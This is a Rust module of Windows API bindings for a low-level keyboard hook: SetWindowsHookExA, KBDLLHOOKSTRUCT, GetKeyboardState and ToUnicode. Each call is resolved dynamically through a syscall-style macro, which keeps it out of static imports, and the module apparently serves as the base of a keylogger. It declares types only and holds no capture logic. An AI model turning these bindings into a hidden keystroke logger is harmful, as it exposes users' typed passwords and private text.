#![allow(non_snake_case, clippy::upper_case_acronyms, non_camel_case_types)]
mod winapi {
    use wsyscall_rs::wintypes::HMODULE;

    pub const WH_KEYBOARD_LL: i32 = 13;
    pub const WM_KEYDOWN: u32 = 256;

    pub type WPARAM = usize;
    pub type LPARAM = isize;
    pub type LRESULT = isize;

    pub type HOOKPROC =
        Option<unsafe extern "system" fn(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT>;
    pub type HHOOK = *mut core::ffi::c_void;
    pub type HINSTANCE = *mut core::ffi::c_void;
    pub type HWND = *mut core::ffi::c_void;
    pub type BOOL = i32;

    #[repr(C)]
    pub struct POINT {
        pub x: i32,
        pub y: i32,
    }

    #[repr(C)]
    pub struct MSG {
        pub hwnd: HWND,
        pub message: u32,
        pub wparam: WPARAM,
        pub lparam: LPARAM,
        pub time: u32,
        pub pt: POINT,
    }

    #[repr(C)]
    pub struct KBDLLHOOKSTRUCT {
        pub vkCode: u32,
        pub scanCode: u32,
        pub flags: u32,
        pub time: u32,
        pub dwExtraInfo: usize,
    }

    dynamic_invoke_imp!("KERNEL32.DLL", LoadLibraryA, (lpLibFileName: *const u8) -> HMODULE);
    dynamic_invoke_imp!("KERNEL32.DLL", GetLastError, () -> u32);
    dynamic_invoke_imp!("KERNEL32.DLL", GetModuleHandleA, (lpModuleName: *const u8) -> HMODULE);

    dynamic_invoke_imp!("KERNEL32.DLL", CloseHandle, (hObject: HMODULE) -> BOOL);

    dynamic_invoke_imp!("user32.dll", SetWindowsHookExA, (idHook: i32, lpfn: HOOKPROC, hmod: HINSTANCE, dwThreadId: u32) -> HHOOK);
    dynamic_invoke_imp!("user32.dll", CallNextHookEx, (hhk: HHOOK, code: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT);
    dynamic_invoke_imp!("user32.dll", UnhookWindowsHookEx, (hhk: HHOOK) -> BOOL);

    dynamic_invoke_imp!("user32.dll", GetMessageA, (lpmsg: *mut MSG,hwnd: HWND, wmsgfiltermin: u32, wmsgfiltermax: u32) -> BOOL);
    dynamic_invoke_imp!("user32.dll", TranslateMessage, (lpmsg: *const MSG) -> BOOL);
    dynamic_invoke_imp!("user32.dll", DispatchMessageA, (lpmsg: *const MSG) -> LRESULT);
    dynamic_invoke_imp!("user32.dll", GetKeyboardState, (lpkeystate: *mut u8) -> BOOL);
    dynamic_invoke_imp!("user32.dll", ToUnicode, (wvirtkey: u32, wscancode: u32, lpkeystate: *const u8, pwszbuff: *mut u16, cchbuff: i32, wflags: u32) -> i32);
}

pub(crate) use winapi::*;
